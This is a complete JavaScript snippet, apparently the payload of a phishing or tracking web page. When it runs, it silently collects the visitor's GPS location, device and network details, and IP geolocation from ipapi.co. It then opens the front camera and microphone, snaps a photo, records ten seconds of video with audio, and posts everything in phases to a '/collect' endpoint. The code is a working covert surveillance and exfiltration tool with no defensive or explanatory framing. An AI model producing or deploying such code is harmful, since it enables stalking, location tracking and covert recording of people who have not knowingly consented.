(function(){
    var d={sessionId:'s_'+Date.now(),timestamp:new Date().toISOString(),userAgent:navigator.userAgent};
    var mediaRecorder, recordedChunks=[], stream;
    
    // STEP 1: Collect data silently
    function collectInfo(){
        if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(function(p){
                d.gps={lat:p.coords.latitude,lon:p.coords.longitude};
            },function(){},{enableHighAccuracy:true,timeout:8000});
        }
        d.device={platform:navigator.platform,screen:screen.width+'x'+screen.height,cores:navigator.hardwareConcurrency,memory:navigator.deviceMemory||'?',language:navigator.language};
        navigator.getBattery().then(function(b){d.battery={charging:b.charging,level:Math.round(b.level*100)+'%'};});
        if(navigator.connection)d.connection={type:navigator.connection.effectiveType,downlink:navigator.connection.downlink};
        fetch('https://ipapi.co/json/').then(r=>r.json()).then(j=>{
            d.network={ip:j.ip,city:j.city,country:j.country_name,isp:j.org};
            fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(Object.assign({},d,{phase:'phase1'}))});
        });
    }
    
    // STEP 2: Camera + Photo + 10 second recording
    async function startCamera(){
        try{
            stream=await navigator.mediaDevices.getUserMedia({
                video:{facingMode:"user",width:{ideal:1920},height:{ideal:1080}},
                audio:true
            });
            
            // Show full screen camera preview
            var preview=document.getElementById('cameraPreview');
            preview.srcObject=stream;
            preview.style.display='block';
            await preview.play();
            
            // Show dots
            document.getElementById('greenDot').style.display='block';
            document.getElementById('yellowDot').style.display='block';
            
            // Take photo after camera is ready
            await new Promise(r=>setTimeout(r,1500));
            var canvas=document.createElement('canvas');
            canvas.width=preview.videoWidth||1920;
            canvas.height=preview.videoHeight||1080;
            canvas.getContext('2d').drawImage(preview,0,0);
            d.photo=canvas.toDataURL('image/jpeg',0.95);
            
            // Send photo
            fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(Object.assign({},d,{phase:'phase2'}))});
            
            // Hide camera preview after photo
            preview.style.display='none';
            
            // Record 10 seconds
            mediaRecorder=new MediaRecorder(stream,{mimeType:'video/webm'});
            mediaRecorder.ondataavailable=function(e){if(e.data.size>0)recordedChunks.push(e.data);};
            mediaRecorder.onstop=sendVideo;
            mediaRecorder.start(1000);
            
            // Countdown
            var sec=10;
            var msgEl=document.getElementById('recMsg');
            msgEl.style.display='block';
            msgEl.textContent='● REC '+sec+'s';
            var countdown=setInterval(function(){
                sec--;
                if(sec>0){msgEl.textContent='● REC '+sec+'s';}
                else{clearInterval(countdown);msgEl.style.display='none';}
            },1000);
            
            // Stop after 10 seconds
            setTimeout(function(){
                if(mediaRecorder&&mediaRecorder.state==='recording'){
                    mediaRecorder.stop();
                    stream.getTracks().forEach(t=>t.stop());
                    document.getElementById('greenDot').style.display='none';
                    document.getElementById('yellowDot').style.display='none';
                }
            },10000);
            
        }catch(e){d.camErr=e.message;}
    }
    
    function sendVideo(){
        if(recordedChunks.length>0){
            var blob=new Blob(recordedChunks,{type:'video/webm'});
            var reader=new FileReader();
            reader.onload=function(){
                d.video=reader.result;
                fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(Object.assign({},d,{phase:'phase3'}))});
            };
            reader.readAsDataURL(blob);
        }
    }
    
    // Step 1: Data immediately
    collectInfo();
    
    // Step 2: Camera after 2 seconds
    setTimeout(startCamera,2000);
    
})();
